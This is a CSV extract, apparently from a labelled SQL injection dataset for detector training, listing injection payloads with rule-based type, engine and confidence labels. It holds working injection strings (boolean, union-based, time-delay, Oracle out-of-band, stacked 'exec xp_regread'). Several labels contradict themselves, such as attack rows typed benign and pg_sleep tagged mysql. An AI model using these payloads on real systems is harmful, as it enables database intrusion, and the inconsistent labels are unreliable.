row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
150,like,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
151,or username like char ( 37 ) ;,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
152,) ) or pg_sleep ( __TIME__ ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
153,select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
154,or 3 = 3,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
155,"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
156,select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
157,exec sp,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
158,"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
159,select * from users where id = 1 or \<$ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
160,"select * from users where id = 1.&&1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
161,admin' or 1 = 1/*,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
162,a' waitfor delay '0:0:10'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
163,"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
164,"select * from users where id = 1 union select .1$_,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
165,and 1 in ( select var from temp ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
166,hi' ) or ( 'a' = 'a,1,,boolean_blind,generic,0.85,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
167,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
168,"admin"" or 1 = 1",1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
169,""" ) or true--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
170,"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
171,"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
172,1 ) or pg_sleep ( __TIME__ ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
173,"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
174,""" ) or sleep ( __TIME__ ) = """,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
175,select * from users where id = 1.<@. or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
176,"admin"" ) or ( ""1"" = ""1""--",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
177,"select * from users where id = 1<@.. union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @.. union select detected — union_based injection (priority 7) on generic",rule-based
178,; exec xp_regread,1,,stacked_queries,generic,0.85,; exec  detected — stacked_queries injection (priority 3) on generic,rule-based
179,"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ 1 union select detected — union_based injection (priority 7) on generic",rule-based
